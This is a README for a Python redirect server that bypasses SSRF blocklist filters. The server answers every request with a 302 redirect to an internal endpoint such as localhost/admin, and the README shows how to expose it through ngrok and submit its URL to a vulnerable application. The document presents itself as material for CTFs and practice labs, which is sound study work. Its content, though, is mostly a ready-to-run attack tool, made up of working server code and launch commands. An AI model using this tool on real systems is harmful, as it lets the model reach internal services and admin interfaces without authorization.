# SSRF-with-malicious-server
Very simple python server which bypasses black list by redirecting the user to the given URL. This is only intended to be used for educational purposes, such as in CTFs, practicing in vulnerable VMs, etc.

This script exploits a vulnerability that occurs when improperly preventing SSRF attacks with Black Lists. Since the DNS resolution only occurs after the security filter is applied, we can craft a server with a valid URL which contains a redirect to the desired URL.

## Instructions

### 1) Running the server locally

```python
import http.server
import socketserver

# --- Configuration ---
# Set the URL you want the vulnerable server to be redirected to.
# This is the internal endpoint you are targeting in the lab.
TARGET_URL = "http://localhost/admin" 
PORT = 8000
# -------------------

class RedirectHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"Received request, redirecting to: {TARGET_URL}")
        self.send_response(302) # 302 is a temporary redirect
        self.send_header('Location', TARGET_URL)
        self.end_headers()

# Creates and runs the server
with socketserver.TCPServer(("", PORT), RedirectHandler) as httpd:
    print(f"Redirect server running on port {PORT}")
    print(f"Any request will be redirected to {TARGET_URL}")
    httpd.serve_forever()
```

In this small piece of code, all you have to do is change the value of the ```TARGET_URL``` to your desired Server-side target.

Save the file and run the following command on your machine:

```bash
python3 server.py
```

The Server will start on port 8000 and will redirect any requests made to it to the TARGET_URL.

### 2) Hosting the server with ngrok

Now, in order to make the server accessible to the internet, we'll use ngrok to do so. You can get more details on how to set up ngrok on your machine [here](https://ngrok.com/).

Once you have your server running and ngrok ready to go, run the following command on your terminal:

```bash
ngrok http 8000
```

This will expose the server running on port 8000 to the internet. Your terminal should look like this:

```
ngrok                                                                                                                                                                                               (Ctrl+C to quit)
                                                                                                                                                                                                                    
🫶 Using ngrok for OSS? Request a community license: https://ngrok.com/r/oss                                                                                                                                        
                                                                                                                                                                                                                    
Session Status                online                                                                                                                                                                                
Account                       <Your Username> (Plan: Free)                                                                                                                                                    
Update                        update available (version 3.25.0, Ctrl-U to update)                                                                                                                                   
Version                       3.24.0                                                                                                                                                                                
Region                        <Your Region>                                                                                                                                                                    
Latency                       27ms                                                                                                                                                                                  
Web Interface                 http://127.0.0.1:4040                                                                                                                                                                 
Forwarding                    https://<random-text>.ngrok-free.app -> http://localhost:8000                                                                                                                          
                                                                                                                                                                                                                    
Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                                           
                              0       0       0.00    0.00    0.00    0.00
```

You can then copy ```https://<random-text>.ngrok-free.app``` and insert it into the vulnerable application. You can check the requests's logs in the ```Connections``` section in your terminal.


